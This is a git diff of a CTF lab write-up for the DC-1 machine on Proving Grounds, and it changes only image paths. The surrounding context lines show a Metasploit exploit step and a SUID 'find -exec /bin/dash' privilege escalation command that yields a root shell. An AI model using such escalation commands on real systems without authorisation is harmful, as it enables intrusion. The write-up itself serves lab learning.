@@ -70,11 +70,11 @@ set lhost
 exploit
 ```
 
-![img](/assets/images/CTF/Pg-Play/DC-1/msf.png)
+![img](/assets/images/CTF/Proving_Grounds/DC-1/msf.png)
 
 **User shell obtained**
 
-![img](/assets/images/CTF/Pg-Play/DC-1/shell.png)
+![img](/assets/images/CTF/Proving_Grounds/DC-1/shell.png)
 
 ## Enumerate SUIDs
 
@@ -124,7 +124,7 @@ Run the below expoit code to obtain root shell.
 find file -exec "/bin/dash" \; -quit
 ```
 
-![img](/assets/images/CTF/Pg-Play/DC-1/root.png)
+![img](/assets/images/CTF/Proving_Grounds/DC-1/root.png)
 
 **Root shell obtained.**
 
